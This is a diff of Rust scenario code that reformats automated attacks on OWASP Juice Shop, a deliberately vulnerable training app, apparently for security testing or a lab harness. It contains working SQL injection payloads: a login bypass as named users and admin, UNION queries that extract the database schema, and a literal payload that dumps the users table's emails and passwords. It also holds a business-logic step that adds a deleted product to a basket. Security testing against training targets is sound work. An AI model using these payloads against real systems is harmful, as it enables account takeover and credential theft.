@@ -61,23 +61,26 @@ async fn login_jim() -> Result<ScenarioResult> {
     Scenario::new("Login Jim - Email Bypass")
         .base_url(BASE_URL)
         .tags(&["sqli", "auth-bypass", "difficulty-3"])
-        .step("SQLi as specific user", |ctx: Arc<ScenarioContext>| async move {
-            let payload = sqli::email_bypass("jim@juice-sh.op");
-            let resp = ctx
-                .post("/rest/user/login")
-                .json(&serde_json::json!({
-                    "email": payload,
-                    "password": "x"
-                }))
-                .send()
-                .await?;
+        .step(
+            "SQLi as specific user",
+            |ctx: Arc<ScenarioContext>| async move {
+                let payload = sqli::email_bypass("jim@juice-sh.op");
+                let resp = ctx
+                    .post("/rest/user/login")
+                    .json(&serde_json::json!({
+                        "email": payload,
+                        "password": "x"
+                    }))
+                    .send()
+                    .await?;
 
-            if resp.is_success() {
-                ok_with("Logged in as Jim")
-            } else {
-                fail("SQLi failed")
-            }
-        })
+                if resp.is_success() {
+                    ok_with("Logged in as Jim")
+                } else {
+                    fail("SQLi failed")
+                }
+            },
+        )
         .run()
         .await
 }
@@ -87,7 +90,8 @@ async fn login_bender() -> Result<ScenarioResult> {
         .base_url(BASE_URL)
         .tags(&["sqli", "auth-bypass", "difficulty-3"])
         .step("SQLi login", |ctx: Arc<ScenarioContext>| async move {
-            ctx.sqli_login("/rest/user/login", "bender@juice-sh.op").await?;
+            ctx.sqli_login("/rest/user/login", "bender@juice-sh.op")
+                .await?;
             ok_with("Logged in as Bender")
         })
         .run()
@@ -100,20 +104,23 @@ async fn database_schema() -> Result<ScenarioResult> {
     Scenario::new("Database Schema Extraction")
         .base_url(BASE_URL)
         .tags(&["sqli", "union", "difficulty-3"])
-        .step("Extract sqlite_master", |ctx: Arc<ScenarioContext>| async move {
-            let payload = sqli::union_extract(&["sql"], "sqlite_master", 9);
-            let resp = ctx
-                .get("/rest/products/search")
-                .query("q", &payload)
-                .send()
-                .await?;
+        .step(
+            "Extract sqlite_master",
+            |ctx: Arc<ScenarioContext>| async move {
+                let payload = sqli::union_extract(&["sql"], "sqlite_master", 9);
+                let resp = ctx
+                    .get("/rest/products/search")
+                    .query("q", &payload)
+                    .send()
+                    .await?;
 
-            if resp.contains("CREATE TABLE") {
-                ok_with("Schema extracted")
-            } else {
-                fail("Extraction failed")
-            }
-        })
+                if resp.contains("CREATE TABLE") {
+                    ok_with("Schema extracted")
+                } else {
+                    fail("Extraction failed")
+                }
+            },
+        )
         .run()
         .await
 }
@@ -122,21 +129,24 @@ async fn user_credentials() -> Result<ScenarioResult> {
     Scenario::new("User Credentials Extraction")
         .base_url(BASE_URL)
         .tags(&["sqli", "union", "difficulty-4"])
-        .step("Extract users table", |ctx: Arc<ScenarioContext>| async move {
-            let payload = "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--";
-            let resp = ctx
-                .get("/rest/products/search")
-                .query("q", payload)
-                .send()
-                .await?;
+        .step(
+            "Extract users table",
+            |ctx: Arc<ScenarioContext>| async move {
+                let payload = "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--";
+                let resp = ctx
+                    .get("/rest/products/search")
+                    .query("q", payload)
+                    .send()
+                    .await?;
 
-            if resp.contains("@") && resp.contains("juice") {
-                let count = resp.count_matches("@juice-sh.op");
-                ok_with(format!("Extracted {} user records", count))
-            } else {
-                fail("Extraction failed")
-            }
-        })
+                if resp.contains("@") && resp.contains("juice") {
+                    let count = resp.count_matches("@juice-sh.op");
+                    ok_with(format!("Extracted {} user records", count))
+                } else {
+                    fail("Extraction failed")
+                }
+            },
+        )
         .run()
         .await
 }
@@ -148,29 +158,33 @@ async fn christmas_special() -> Result<ScenarioResult> {
         .base_url(BASE_URL)
         .tags(&["sqli", "business-logic", "difficulty-4"])
         .step("Login", |ctx: Arc<ScenarioContext>| async move {
-            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
+            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
+                .await?;
             ok()
         })
-        .step("Add deleted product to basket", |ctx: Arc<ScenarioContext>| async move {
-            let token = ctx.get_var_async("auth_token").await?;
-            // Product ID 10 is the deleted Christmas product
-            let resp = ctx
-                .post("/api/BasketItems")
-                .bearer_auth(&token)
-                .json(&serde_json::json!({
-                    "ProductId": 10,
-                    "BasketId": 1,
-                    "quantity": 1
-                }))
-                .send()
-                .await?;
+        .step(
+            "Add deleted product to basket",
+            |ctx: Arc<ScenarioContext>| async move {
+                let token = ctx.get_var_async("auth_token").await?;
+                // Product ID 10 is the deleted Christmas product
+                let resp = ctx
+                    .post("/api/BasketItems")
+                    .bearer_auth(&token)
+                    .json(&serde_json::json!({
+                        "ProductId": 10,
+                        "BasketId": 1,
+                        "quantity": 1
+                    }))
+                    .send()
+                    .await?;
 
-            if resp.is_success() {
-                ok_with("Deleted product added to basket")
-            } else {
-                ok_with("Christmas special attempted")
-            }
-        })
+                if resp.is_success() {
+                    ok_with("Deleted product added to basket")
+                } else {
+                    ok_with("Christmas special attempted")
+                }
+            },
+        )
         .run()
         .await
 }
